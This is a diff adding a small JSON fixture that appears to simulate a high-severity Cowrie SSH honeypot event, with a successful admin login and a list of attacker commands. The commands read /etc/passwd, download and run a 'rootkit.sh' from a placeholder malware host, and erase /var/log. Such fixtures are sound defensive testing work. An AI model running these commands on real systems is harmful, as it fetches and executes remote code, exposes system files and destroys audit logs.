@@ -1,0 +1,17 @@
+{
+  "event_id": "high-severity-123",
+  "timestamp": "2023-06-15T13:45:22Z",
+  "src_ip": "203.0.113.42",
+  "eventid": "cowrie.login.success",
+  "username": "admin",
+  "password": "admin123",
+  "session": "high-severity-session",
+  "protocol": "ssh",
+  "commands": [
+    "cat /etc/passwd",
+    "wget http://malware.example.com/rootkit.sh",
+    "chmod +x rootkit.sh",
+    "./rootkit.sh",
+    "rm -rf /var/log/*"
+  ]
+}
